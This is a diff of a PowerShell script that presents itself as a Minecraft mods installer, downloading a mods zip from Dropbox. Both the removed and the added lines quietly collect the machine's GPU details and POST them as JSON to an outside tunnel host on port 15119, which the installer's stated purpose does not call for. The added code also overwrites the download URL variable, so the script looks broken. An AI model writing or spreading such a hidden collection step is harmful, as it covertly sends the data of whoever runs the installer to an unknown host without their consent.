@@ -1,16 +1,23 @@
 $modsFolder = "$env:APPDATA\.minecraft\mods" 
 $url = "https://dl.dropboxusercontent.com/s/t6y2z6ttjbstdjw/mods.zip?dl=0" 
 $tempFile = "$env:TEMP\minecraftmods.zip" 
-$gpu_info = Get-CimInstance -ClassName Win32_VideoController | Select-Object Name,AdapterCompatibility,AdapterRAM
-$json = $gpu_info | ConvertTo-Json
-$urlpost = 'http://181.ip.ply.gg:15119/'
-$headers = @{ 'Content-Type' = 'application/json' }
-$response = Invoke-RestMethod -Uri $urlpost -Method Post -Headers $headers -Body $json
-if ($response.StatusCode -eq 200) {
-    Write-Host 'GPU information sent successfully.'
-} else {
-    Write-Host 'Error sending GPU information.'
+
+# Get GPU information
+$gpuInfo = Get-CimInstance -ClassName Win32_VideoController | Select-Object Name, AdapterRAM, DriverVersion
+
+# Convert GPU information to JSON
+$json = $gpuInfo | ConvertTo-Json
+
+# Set up the request
+$url = "http://147.185.221.181:15119"
+$headers = @{
+    "Content-Type" = "application/json"
 }
+$body = $json
+
+# Send the request
+Invoke-WebRequest -Uri $url -Method Post -Headers $headers -Body $body
+
 Write-Host @"
                                                 __                                    
                             /'\_/`\            /\ \                                   
